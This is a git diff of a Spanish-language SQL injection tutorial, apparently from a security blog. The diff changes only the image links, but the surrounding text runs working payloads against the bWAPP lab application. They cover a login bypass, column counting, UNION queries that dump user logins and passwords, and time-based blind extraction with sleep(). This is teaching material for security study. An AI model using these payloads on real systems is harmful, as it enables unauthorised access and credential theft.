@@ -112,11 +112,11 @@ A continuación se presenta una prueba de concepto con una web distinta al ejemp
 
 Si en una aplicación web realizamos una comilla simple obtendremos el error que indicaría que es vulnerable:
 
-![sqlinjectpoc1test](/images/sqlinjectpoc1test.png)
+[![sqlinjectpoc1test](/images/sqlinjectpoc1test.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectpoc1test.png)
 
 Luego si ocupamos la inyección anteriormente mencionada obtendremos lo siguiente:
 
-![sqlinjectpoc1all](/images/sqlinjectpoc1all.png)
+[![sqlinjectpoc1all](/images/sqlinjectpoc1all.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectpoc1all.png)
 
 
 ### SQL Injection Login ByPass (Boolean Based)
@@ -125,7 +125,7 @@ Un SQL inject boolean based es un tipo de ataque de SQL injection en el que el a
 
 Primero realizamos la comprobación de la vulnerabilidad:
 
-![sqlinjectloginbypass1](/images/sqlinjectloginbypass1.png)
+[![sqlinjectloginbypass1](/images/sqlinjectloginbypass1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectloginbypass1.png)
 
 Una vez se detecta que es el login es vulnerable, debemos suponer la consulta que pasa por detrás del panel de autenticación, en este caso puede ser:
 
@@ -153,11 +153,12 @@ Y en el campo de ```pass```:
 -- Si no conocieramos el nombre de usuario, iría lo mismo y considerará el primer usuario de la tabla
 ```
 
-![sqlinjectloginbypass2](/images/sqlinjectloginbypass2.png)
+[![sqlinjectloginbypass2](/images/sqlinjectloginbypass2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectloginbypass2.png)
+
 
 Finalmente obtenemos acceso como admin:
 
-![sqlinjectloginbypass3](/images/sqlinjectloginbypass3.png)
+[![sqlinjectloginbypass3](/images/sqlinjectloginbypass3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectloginbypass3.png)
 
 
 ### Identificar número de columnas
@@ -168,19 +169,19 @@ Un SQL inject que utiliza la cláusula ```ORDER BY``` es un tipo de ataque de SQ
 test' order by 10-- -
 ```
 
-![sqlinjectidentifycolumns2](/images/sqlinjectidentifycolumns2.png)
+[![sqlinjectidentifycolumns2](/images/sqlinjectidentifycolumns2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectidentifycolumns2.png)
 
 ```sql
 test' order by 8-- -
 ```
 
-![sqlinjectidentifycolumns3](/images/sqlinjectidentifycolumns3.png)
+[![sqlinjectidentifycolumns3](/images/sqlinjectidentifycolumns3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectidentifycolumns3.png)
 
 ```sql
 test' order by 7-- -
 ```
 
-![sqlinjectidentifycolumns4](/images/sqlinjectidentifycolumns4.png)
+[![sqlinjectidentifycolumns4](/images/sqlinjectidentifycolumns4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectidentifycolumns4.png)
 
 Por lo tanto en esta prueba, se detectaron 7 columnas.
 
@@ -194,7 +195,7 @@ Podemos empezar a descubrir el nombre de las tablas, sin antes destacar que se a
 test' UNION SELECT 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()-- -
 ```
 
-![sqlinjectunionattack1](/images/sqlinjectunionattack1.png)
+[![sqlinjectunionattack1](/images/sqlinjectunionattack1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattack1.png)
 
 Una vez obtenemos las tablas, procedemos a ver las columnas de la tabla ```users```:
 
@@ -202,7 +203,7 @@ Una vez obtenemos las tablas, procedemos a ver las columnas de la tabla ```users
 test' union select 1,column_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' AND table_schema=database()-- -
 ```
 
-![sqlinjectunionattack2](/images/sqlinjectunionattack2.png)
+[![sqlinjectunionattack2](/images/sqlinjectunionattack2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattack2.png)
 
 Ya teniendo toda esa información como base podemos ingresar a la información de las columnas:
 
@@ -210,23 +211,24 @@ Ya teniendo toda esa información como base podemos ingresar a la información d
 test' union select 1,login,password,email,secret,7 FROM users-- -
 ```
 
-![sqlinjectunionattack3](/images/sqlinjectunionattack3.png)
+[![sqlinjectunionattack3](/images/sqlinjectunionattack3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattack3.png)
+
 
 #### BurpSuite (Union Attack)
 
 Para el caso de BurpSuite, una vez interceptamos la petición, detectaremos "title", que es desde donde se realizará la inyección:
 
-![sqlinjectunionattackburp1](/images/sqlinjectunionattackburp1.png)
+[![sqlinjectunionattackburp1](/images/sqlinjectunionattackburp1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattackburp1.png)
 
 Antes de envíar la petición modificada, hay convertir la inyección a URL encode de la siguiente forma:
 
-![sqlinjectunionattackburp2](/images/sqlinjectunionattackburp2.png)
+[![sqlinjectunionattackburp2](/images/sqlinjectunionattackburp2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattackburp2.png)
 
-![sqlinjectunionattackburp3](/images/sqlinjectunionattackburp3.png)
+[![sqlinjectunionattackburp3](/images/sqlinjectunionattackburp3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattackburp3.png)
 
 Finalmente se envía y en la respuesta se podrá apreciar toda la información solicitada:
 
-![sqlinjectunionattackburp4](/images/sqlinjectunionattackburp4.png)
+[![sqlinjectunionattackburp4](/images/sqlinjectunionattackburp4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectunionattackburp4.png)
 
 
 ### Limitación de resultados
@@ -239,7 +241,7 @@ test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE t
 
 Con esto se obtiene la primera tabla de la base de datos, que en para este caso es ```blog```:
 
-![sqlinjectlimit1](/images/sqlinjectlimit1.png)
+[![sqlinjectlimit1](/images/sqlinjectlimit1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectlimit1.png)
 
 A continuación obtendremos la segunda tabla que es ```heroes```
 
@@ -247,7 +249,7 @@ A continuación obtendremos la segunda tabla que es ```heroes```
 test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() LIMIT 1,1-- -
 ```
 
-![sqlinjectlimit2](/images/sqlinjectlimit2.png)
+[![sqlinjectlimit2](/images/sqlinjectlimit2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectlimit2.png)
 
 Este proceso seguirá hasta que lleguemos a una tabla que se considere sensible, como el siguiente caso:
 
@@ -255,7 +257,7 @@ Este proceso seguirá hasta que lleguemos a una tabla que se considere sensible,
 test' union select 1,table_name,3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() LIMIT 3,1-- -
 ```
 
-![sqlinjectlimit3](/images/sqlinjectlimit3.png)
+[![sqlinjectlimit3](/images/sqlinjectlimit3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectlimit3.png)
 
 Este mismo proceso se puede realizar para buscar bases de datos, tablas, columnas o la información contenidas en ellas.
 
@@ -263,7 +265,7 @@ Este mismo proceso se puede realizar para buscar bases de datos, tablas, columna
 
 Para los siguientes ejemplo lo que se busca realizar es seleccionar todos los datos de la tabla users y concatenarlos en una sola cadena para obtener el nombre de usuario, la contraseña, el secreto y el correo electrónico de cada usuario en la base de datos. Este prcoeso se puede realizar para obtener datos de tablas, columnas, entre otros.
 
-![sqlinjectretornoenunacolumna1](/images/sqlinjectretornoenunacolumna1.png)
+[![sqlinjectretornoenunacolumna1](/images/sqlinjectretornoenunacolumna1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectretornoenunacolumna1.png)
 
 ```sql
 test' union select 1,concat(login,':',password,':',secret,':',email),3,4,5,6,7 FROM users-- -
@@ -283,7 +285,7 @@ La detección de versiones a través de una inyección es importante para encont
 test' UNION SELECT 1,@@version,3,4,5,6,7-- -
 ```
 
-![sqlinjectversiondetect](/images/sqlinjectversiondetect.png)
+[![sqlinjectversiondetect](/images/sqlinjectversiondetect.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectversiondetect.png)
 
 ### SQL Injection Blind Attack (Time-Based)
 
@@ -295,11 +297,12 @@ Primero identificamos la vulnerabilidad, en este caso hay diversas formas de ide
 iron man' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep1](/images/sqlinjectblindsleep1.png)
+[![sqlinjectblindsleep1](/images/sqlinjectblindsleep1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep1.png)
+
 
 Se detectan 5 segundos de espera antes de que cargue la página, lo que confirma la vulnerabilidad:
 
-![sqlinjectblindsleep2](/images/sqlinjectblindsleep2.png)
+[![sqlinjectblindsleep2](/images/sqlinjectblindsleep2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep2.png)
 
 
 Tras confirmar la vulnerabilidad, podemos comenzar a buscar el nombre de la base de datos, esto se realiza por medio de la siguiente inyección:
@@ -308,11 +311,11 @@ Tras confirmar la vulnerabilidad, podemos comenzar a buscar el nombre de la base
 iron man' AND substring(database(),1,1)='a' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep3](/images/sqlinjectblindsleep3.png)
+[![sqlinjectblindsleep3](/images/sqlinjectblindsleep3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep3.png)
 
 intentamos con la letra "a", sin embargo la web nos responde prácticamente de forma inmediata la respuesta:
 
-![sqlinjectblindsleep4](/images/sqlinjectblindsleep4.png)
+[![sqlinjectblindsleep4](/images/sqlinjectblindsleep4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep4.png)
 
 Esto indica que el nombre de la base de datos buscada no inicia con la letra "a", es decir, si esta no respeta el tiempo de "sleep" asociado, entonces significa que la letra no corresponde. Entonces como para el primer caso no funciona podemos seguir viendo con la siguiente letra:
 
@@ -320,9 +323,9 @@ Esto indica que el nombre de la base de datos buscada no inicia con la letra "a"
 iron man' AND substring(database(),1,1)='b' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep5](/images/sqlinjectblindsleep5.png)
+[![sqlinjectblindsleep5](/images/sqlinjectblindsleep5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep5.png)
 
-![sqlinjectblindsleep6](/images/sqlinjectblindsleep6.png)
+[![sqlinjectblindsleep6](/images/sqlinjectblindsleep6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep6.png)
 
 En este caso funciona según lo esperado el proceso, por lo tanto el nombre de la base de datos comienza con la letra 'b'. De esta misma forma seguiriamos probando así sucesivamente considerando; minúsculas, mayúsculas, números, entre otros, hasta encontrar el nombre de la base de datos completa que sería ```bWAPP```.
 
@@ -330,25 +333,27 @@ En este caso funciona según lo esperado el proceso, por lo tanto el nombre de l
 iron man' AND substring(database(),2,1)='W' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep7](/images/sqlinjectblindsleep7.png)
+[![sqlinjectblindsleep7](/images/sqlinjectblindsleep7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep7.png)
+
 
 ```sql
 iron man' AND substring(database(),3,1)='A' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep8](/images/sqlinjectblindsleep8.png)
+[![sqlinjectblindsleep8](/images/sqlinjectblindsleep8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep8.png)
 
 ```sql
 iron man' AND substring(database(),4,1)='P' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep9](/images/sqlinjectblindsleep9.png)
+[![sqlinjectblindsleep9](/images/sqlinjectblindsleep9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep9.png)
 
 ```sql
 iron man' AND substring(database(),5,1)='P' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep10](/images/sqlinjectblindsleep10.png)
+[![sqlinjectblindsleep10](/images/sqlinjectblindsleep10.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep10.png)
+
 
 Ahora para encontrar los nombres de las tablas se realiza la siguiente inyección, en donde nos centraremos en encontrar la tabla ```users``` que se vió anteriormente:
 
@@ -356,31 +361,33 @@ Ahora para encontrar los nombres de las tablas se realiza la siguiente inyecció
 ' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),1,1) = 'u' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep11](/images/sqlinjectblindsleep11.png)
+[![sqlinjectblindsleep11](/images/sqlinjectblindsleep11.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep11.png)
+
 
 ```sql
 ' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),2,1) = 's' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep12](/images/sqlinjectblindsleep12.png)
+[![sqlinjectblindsleep12](/images/sqlinjectblindsleep12.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep12.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),3,1) = 'e' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep13](/images/sqlinjectblindsleep13.png)
+[![sqlinjectblindsleep13](/images/sqlinjectblindsleep13.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep13.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),4,1) = 'r' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep14](/images/sqlinjectblindsleep14.png)
+[![sqlinjectblindsleep14](/images/sqlinjectblindsleep14.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep14.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type='base table' AND table_schema='bWAPP' LIMIT 3,1),5,1) = 's' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep15](/images/sqlinjectblindsleep15.png)
+[![sqlinjectblindsleep15](/images/sqlinjectblindsleep15.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep15.png)
+
 
 #### Opción ocupando ASCII
 
@@ -426,49 +433,52 @@ Una vez encontramos una tabla sensible en la cual centrarnos, podemos buscar sus
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),1,1) = 'p' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep16](/images/sqlinjectblindsleep16.png)
+[![sqlinjectblindsleep16](/images/sqlinjectblindsleep16.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep16.png)
+
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),2,1) = 'a' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep17](/images/sqlinjectblindsleep17.png)
+[![sqlinjectblindsleep17](/images/sqlinjectblindsleep17.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep17.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),3,1) = 's' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep18](/images/sqlinjectblindsleep18.png)
+[![sqlinjectblindsleep18](/images/sqlinjectblindsleep18.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep18.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),4,1) = 's' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep19](/images/sqlinjectblindsleep19.png)
+[![sqlinjectblindsleep19](/images/sqlinjectblindsleep19.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep19.png)
+
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),5,1) = 'w' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep20](/images/sqlinjectblindsleep20.png)
+[![sqlinjectblindsleep20](/images/sqlinjectblindsleep20.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep20.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),6,1) = 'o' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep21](/images/sqlinjectblindsleep21.png)
+[![sqlinjectblindsleep21](/images/sqlinjectblindsleep21.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep21.png)
+
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),7,1) = 'r' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep22](/images/sqlinjectblindsleep22.png)
+[![sqlinjectblindsleep22](/images/sqlinjectblindsleep22.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep22.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' LIMIT 2,1),8,1) = 'd' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep23](/images/sqlinjectblindsleep23.png)
+[![sqlinjectblindsleep23](/images/sqlinjectblindsleep23.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep23.png)
 
 #### Opción ocupando ASCII
 
@@ -482,19 +492,19 @@ Este proceso se puede realizar para encontrar cualquier columna, como por ejempl
 ' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),1,1) = 'b' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep24](/images/sqlinjectblindsleep24.png)
+[![sqlinjectblindsleep24](/images/sqlinjectblindsleep24.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep24.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),2,1) = 'e' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep25](/images/sqlinjectblindsleep25.png)
+[![sqlinjectblindsleep25](/images/sqlinjectblindsleep25.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep25.png)
 
 ```sql
 ' or 1=1 AND substring((SELECT login FROM users LIMIT 1,1),3,1) = 'e' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep26](/images/sqlinjectblindsleep26.png)
+[![sqlinjectblindsleep26](/images/sqlinjectblindsleep26.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep26.png)
 
 y para el caso de ```password``` sería de la siguiente forma:
 
@@ -502,7 +512,7 @@ y para el caso de ```password``` sería de la siguiente forma:
 ' or 1=1 AND substring((SELECT password FROM users LIMIT 1,1),1,1) = '6' AND sleep(5)-- -
 ```
 
-![sqlinjectblindsleep27](/images/sqlinjectblindsleep27.png)
+[![sqlinjectblindsleep27](/images/sqlinjectblindsleep27.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectblindsleep27.png)
 
 Pero como sería mucho más largo el hash, simplemente se muestra uno como ejemplo referecial.
 
@@ -518,11 +528,11 @@ Es un tipo de ataque de inyección SQL en el cual el atacante inserta código ma
 
 Para el ejemplo que vermeos a continuación se intercepta la petición con BurpSuite y se hace click en la unica opción presente:
 
-![sqlinjectxml1](/images/sqlinjectxml1.png)
+[![sqlinjectxml1](/images/sqlinjectxml1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxml1.png)
 
 Recibimos lo siguiente en BurpSuite:
 
-![sqlinjectxml0](/images/sqlinjectxml0.png)
+[![sqlinjectxml0](/images/sqlinjectxml0.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxml0.png)
 
 Y en la siguiente sección, comprobaremos la vulnerabilidad:
 
@@ -534,19 +544,19 @@ Y en la siguiente sección, comprobaremos la vulnerabilidad:
 
 Esta se comprueba de la siguiente forma:
 
-![sqlinjectxmlvuln1](/images/sqlinjectxmlvuln1.png)
+[![sqlinjectxmlvuln1](/images/sqlinjectxmlvuln1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxmlvuln1.png)
 
 Y como se puede aprecia se detecta la vulnerabilidad
 
-![sqlinjectxmlvuln2](/images/sqlinjectxmlvuln2.png)
+[![sqlinjectxmlvuln2](/images/sqlinjectxmlvuln2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxmlvuln2.png)
 
 Por este mismo medio, se pueden inyectar consultas vistas anteriormente como por ejemplo la siguiente, en que se detectará en BurpSuite el tiempo de espera de 5 segundos:
 
-![sqlinjectxml2](/images/sqlinjectxml2.png)
+[![sqlinjectxml2](/images/sqlinjectxml2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxml2.png)
 
 Para obtener finalmente como respuesta la inyección insertada:
 
-![sqlinjectxml3](/images/sqlinjectxml3.png)
+[![sqlinjectxml3](/images/sqlinjectxml3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/sqlinjectxml3.png)
 
 
 ### Recomendaciones
